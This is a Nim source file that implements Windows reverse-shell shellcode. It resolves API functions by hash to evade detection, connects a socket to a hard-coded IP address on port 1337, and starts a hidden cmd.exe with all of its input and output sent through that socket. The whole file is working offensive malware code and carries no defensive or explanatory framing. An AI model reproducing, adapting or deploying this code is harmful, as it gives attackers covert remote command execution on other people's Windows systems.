import utils/[getmoduleh, getprocaddr, str, hash]
import winim

# declaring needed functions
type LoadLibraryA   = (proc(lpLibFileName: LPCSTR): HMODULE {.stdcall.})
type WSAStartup     = (proc(wVersionRequested: WORD, lpWSAData: LPWSADATA): int32 {.stdcall.})
type WSASocketA     = (proc(af: int32, `type`: int32, protocol: int32, lpProtocolInfo: LPWSAPROTOCOL_INFOA, g: GROUP, dwFlags: DWORD): SOCKET {.stdcall.})
type inet_addr      = (proc(cp: ptr char): int32 {.stdcall.})
type htons          = (proc(hostshort: uint16): uint16 {.stdcall.})
type connect        = (proc(s: SOCKET, name: ptr sockaddr, namelen: int32): int32 {.stdcall.})
type CreateProcessA = (proc(lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.})

proc main() =
  asm """
    and rsp, 0xfffffffffffffff0
    mov rbp, rsp
    # since no stack frame is generated from main, we manage the stack size
    #sub rsp, 0x100    # allocate stack space, arbitrary size ... depends on payload
  """
  #[ Start of PIC shellcode]#
  var 
    sHost {.stackStringA.} = "192.168.125.151"
    port: uint16 = 1337
    wsaData: WSADATA
    sCmd {.stackStringA.} = "cmd"
    sws2_32 {.stackStringA.} = "ws2_32.dll"

  const 
    hashKernel32 = hashStringDjb2A("KERNEL32.dll")
    hashLoadLibraryA = hashStringDjb2A("LoadLibraryA")
    hashWSAStartup = hashStringDjb2A("WSAStartup")
    hashWSASocketA = hashStringDjb2A("WSASocketA")
    hashinet_addr = hashStringDjb2A("inet_addr")
    hashhtons = hashStringDjb2A("htons")
    hashconnect = hashStringDjb2A("connect")
    hashCreateProcessA = hashStringDjb2A("CreateProcessA")

  var
    hKernel32: HMODULE = locateKernel32()
    pLoadLibraryA: LoadLibraryA = cast[LoadLibraryA](getProcAddressHash(hKernel32, hashLoadLibraryA))
    hws2_32: HMODULE = pLoadLibraryA(cast[cstring](addr sws2_32[0]))
    pWSAStartup: WSAStartup = cast[WSAStartup](getProcAddressHash(hws2_32, hashWSAStartup))
    pWSASocketA: WSASocketA = cast[WSASocketA](getProcAddressHash(hws2_32, hashWSASocketA))
    pinet_addr: inet_addr = cast[inet_addr](getProcAddressHash(hws2_32, hashinet_addr))
    phtons: htons = cast[htons](getProcAddressHash(hws2_32, hashhtons))
    pconnect: connect = cast[connect](getProcAddressHash(hws2_32, hashconnect))
    pCreateProcessA: CreateProcessA = cast[CreateProcessA](getProcAddressHash(hKernel32, hashCreateProcessA))

  # call WSAStartup
  var wsaStartupRes = pWSAStartup(MAKEWORD(2,2), addr wsaData)
  # if socket != 0: failCatch()

  # call WSASocket
  var socket = pWSASocketA(2, 1, 6, NULL, cast[GROUP](0), cast[DWORD](NULL))

  # create sockaddr_in struct
  var sa: sockaddr_in
  sa.sin_family = AF_INET
  sa.sinaddr.S_addr = pinet_addr(cast[cstring](addr sHost[0]))
  sa.sin_port = phtons(port)

  # call connect
  var connectResult = pconnect(socket, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))
  # if connectResult != 0: failCatch()

  # call CreateProcessA
  var 
    si: STARTUPINFO
    pi: PROCESS_INFORMATION
  si.cb = cast[DWORD](sizeof(si))
  si.dwFlags = STARTF_USESTDHANDLES
  si.hStdInput = cast[HANDLE](socket)
  si.hStdOutput = cast[HANDLE](socket)
  si.hStdError = cast[HANDLE](socket)

  discard pCreateProcessA(
    NULL,
    cast[LPSTR](addr sCmd[0]),
    NULL,
    NULL,
    TRUE,
    CREATE_NO_WINDOW,
    NULL,
    NULL,
    cast[LPSTARTUPINFOA](addr si),
    addr pi
  )

when isMainModule:
  main()